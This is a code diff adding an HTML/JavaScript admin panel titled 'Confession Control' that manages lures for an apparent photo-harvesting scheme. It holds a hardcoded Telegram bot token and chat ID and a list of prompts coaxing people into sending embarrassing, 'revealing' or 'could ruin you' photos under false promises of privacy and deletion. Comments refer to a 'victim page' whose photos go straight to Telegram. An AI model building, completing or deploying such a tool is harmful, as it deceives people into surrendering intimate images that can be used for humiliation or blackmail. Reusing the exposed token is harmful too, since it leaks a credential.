@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Admin • Confession Control</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #0f0f1a;
+      padding: 2rem;
+    }
+    .container { max-width: 1400px; margin: 0 auto; }
+    h1 { color: #ff6b6b; margin-bottom: 0.5rem; }
+    .sub { color: #888; margin-bottom: 2rem; }
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 1rem;
+      margin-bottom: 2rem;
+    }
+    .stat-card {
+      background: #1a1a2e;
+      border-radius: 24px;
+      padding: 1.2rem;
+      text-align: center;
+      border: 1px solid #2a2a40;
+    }
+    .stat-number { font-size: 2.5rem; font-weight: 700; color: #ff6b6b; }
+    .stat-label { color: #888; font-size: 0.8rem; margin-top: 0.3rem; }
+    .admin-section {
+      background: #1a1a2e;
+      border-radius: 32px;
+      padding: 1.5rem;
+      margin-bottom: 2rem;
+      border: 1px solid #2a2a40;
+    }
+    .section-title {
+      font-size: 1.3rem;
+      font-weight: 600;
+      margin-bottom: 1rem;
+      color: #fdcb6e;
+    }
+    select, button {
+      background: #2a2a40;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 40px;
+      color: white;
+      font-family: inherit;
+      cursor: pointer;
+      margin-right: 10px;
+    }
+    select { background: #16213e; }
+    button { background: #ff6b6b; font-weight: 600; }
+    button:hover { opacity: 0.9; }
+    .questions-list {
+      margin-top: 1rem;
+    }
+    .question-item {
+      background: #2a2a40;
+      border-radius: 16px;
+      padding: 12px;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .question-text { flex: 1; color: #fff; font-size: 0.9rem; }
+    .active-badge {
+      background: #00b894;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 0.7rem;
+    }
+    .set-active-btn {
+      background: #ff6b6b;
+      border: none;
+      padding: 6px 16px;
+      border-radius: 20px;
+      color: white;
+      cursor: pointer;
+      font-size: 0.7rem;
+    }
+    .telegram-logs {
+      background: #1a1a2e;
+      border-radius: 32px;
+      padding: 1.5rem;
+      margin-top: 1rem;
+    }
+    .log-entry {
+      background: #2a2a40;
+      border-radius: 12px;
+      padding: 10px;
+      margin-bottom: 8px;
+      font-size: 0.8rem;
+      color: #ccc;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <h1>🎮 Admin Control Panel</h1>
+  <div class="sub">Change questions • View confessions (check Telegram)</div>
+  
+  <div class="stats-grid">
+    <div class="stat-card"><div class="stat-number" id="totalSent">0</div><div class="stat-label">Total Confessions</div></div>
+    <div class="stat-card"><div class="stat-number" id="todaySent">0</div><div class="stat-label">Today</div></div>
+    <div class="stat-card"><div class="stat-number" id="activeQuestionId">1</div><div class="stat-label">Active Question ID</div></div>
+  </div>
+  
+  <div class="admin-section">
+    <div class="section-title">🔥 Change Active Question</div>
+    <select id="questionSelect"></select>
+    <button id="changeQuestionBtn">Update Active Question</button>
+    <span id="changeStatus" style="color:#00b894; margin-left: 15px;"></span>
+  </div>
+  
+  <div class="admin-section">
+    <div class="section-title">📋 All Questions</div>
+    <div id="questionsList" class="questions-list"></div>
+  </div>
+  
+  <div class="telegram-logs">
+    <div class="section-title">📸 Photos Received</div>
+    <div style="color: #888; font-size: 0.8rem; margin-bottom: 1rem;">
+      All photos are sent directly to Telegram. Open Telegram to view them.<br>
+      <strong>Bot:</strong> @your_bot_name<br>
+      <strong>Check saved messages or chat with bot</strong>
+    </div>
+    <button id="openTelegramBtn" style="background: #0088cc; margin-top: 10px;">📱 Open Telegram</button>
+  </div>
+</div>
+
+<script>
+  // ============ TELEGRAM CONFIG ============
+  const TELEGRAM_BOT_TOKEN = "8618295467:AAHm-6BCUW4nbPALsBQmdth12-S-WhXypmE";
+  const TELEGRAM_CHAT_ID = "6841194594";
+  // =========================================
+
+  const QUESTIONS = [
+    { id: 1, text: "📸 Send your most embarrassing photo", sub: "no one will see it • just for the game" },
+    { id: 2, text: "🤢 Send your ugliest selfie", sub: "we promise to delete after laugh" },
+    { id: 3, text: "😈 Send that photo you never showed anyone", sub: "your darkest secret stays here" },
+    { id: 4, text: "📱 Send your worst screenshot", sub: "the one you regret taking" },
+    { id: 5, text: "🍑 Send your most revealing pic", sub: "we won't judge" },
+    { id: 6, text: "💀 Send the photo that could ruin you", sub: "trust me, it's safe" },
+    { id: 7, text: "🎯 Send your guilty pleasure pic", sub: "what you hide from everyone" },
+    { id: 8, text: "🤫 Send that one photo", sub: "you know which one" }
+  ];
+
+  // Load stats from localStorage
+  function loadStats() {
+    const total = localStorage.getItem('total_confessions') || 0;
+    document.getElementById('totalSent').textContent = total;
+    
+    const today = new Date().toDateString();
+    const lastDate = localStorage.getItem('last_date');
+    let todayCount = localStorage.getItem('today_count') || 0;
+    if (lastDate !== today) {
+      todayCount = 0;
+      localStorage.setItem('today_count', 0);
+      localStorage.setItem('last_date', today);
+    }
+    document.getElementById('todaySent').textContent = todayCount;
+    
+    const activeId = localStorage.getItem('active_question_id') || 1;
+    document.getElementById('activeQuestionId').textContent = activeId;
+  }
+
+  // Update stats when new photo received (call from victim page via localStorage event)
+  function incrementCounter() {
+    let total = parseInt(localStorage.getItem('total_confessions') || 0);
+    total++;
+    localStorage.setItem('total_confessions', total);
+    
+    const today = new Date().toDateString();
+    const lastDate = localStorage.getItem('last_date');
+    let todayCount = parseInt(localStorage.getItem('today_count') || 0);
+    if (lastDate !== today) {
+      todayCount = 0;
+      localStorage.setItem('last_date', today);
+    }
+    todayCount++;
+    localStorage.setItem('today_count', todayCount);
+    
+    loadStats();
+  }
+
+  // Listen for cross-tab updates
+  window.addEventListener('storage', (e) => {
+    if (e.key === 'total_confessions' || e.key === 'today_count' || e.key === 'active_question_id') {
+      loadStats();
+    }
+    if (e.key === 'new_confession') {
+      loadStats();
+    }
+  });
+
+  function loadQuestions() {
+    const select = document.getElementById('questionSelect');
+    select.innerHTML = '';
+    QUESTIONS.forEach(q => {
+      const option = document.createElement('option');
+      option.value = q.id;
+      option.textContent = `${q.id}. ${q.text.substring(0, 60)}`;
+      select.appendChild(option);
+    });
+    
+    const activeId = localStorage.getItem('active_question_id') || 1;
+    select.value = activeId;
+    
+    // Display all questions
+    const listDiv = document.getElementById('questionsList');
+    listDiv.innerHTML = '';
+    QUESTIONS.forEach(q => {
+      const activeIdStored = localStorage.getItem('active_question_id') || 1;
+      const isActive = q.id == activeIdStored;
+      const div = document.createElement('div');
+      div.className = 'question-item';
+      div.innerHTML = `
+        <span class="question-text">${q.id}. ${q.text}</span>
+        ${isActive ? '<span class="active-badge">ACTIVE</span>' : ''}
+        <button class="set-active-btn" data-id="${q.id}">Set Active</button>
+      `;
+      listDiv.appendChild(div);
+    });
+    
+    // Add event listeners to all set-active buttons
+    document.querySelectorAll('.set-active-btn').forEach(btn => {
+      btn.addEventListener('click', (e) => {
+        const id = parseInt(btn.getAttribute('data-id'));
+        changeActiveQuestion(id);
+      });
+    });
+  }
+
+  function changeActiveQuestion(id) {
+    localStorage.setItem('active_question_id', id);
+    document.getElementById('activeQuestionId').textContent = id;
+    document.getElementById('changeStatus').textContent = '✅ Updated!';
+    setTimeout(() => document.getElementById('changeStatus').textContent = '', 2000);
+    loadQuestions();
+    
+    // Trigger storage event for victim page
+    window.dispatchEvent(new StorageEvent('storage', { key: 'active_question_id' }));
+  }
+
+  function manualChange() {
+    const newId = parseInt(document.getElementById('questionSelect').value);
+    changeActiveQuestion(newId);
+  }
+
+  // Open Telegram
+  function openTelegram() {
+    window.open('https://t.me/', '_blank');
+  }
+
+  document.getElementById('changeQuestionBtn').addEventListener('click', manualChange);
+  document.getElementById('openTelegramBtn').addEventListener('click', openTelegram);
+
+  // Initial load
+  loadQuestions();
+  loadStats();
+  
+  // Auto-refresh every 2 seconds
+  setInterval(() => {
+    loadStats();
+    loadQuestions();
+  }, 2000);
+
+  document.addEventListener('contextmenu', e => e.preventDefault());
+</script>
+</body>
+</html>
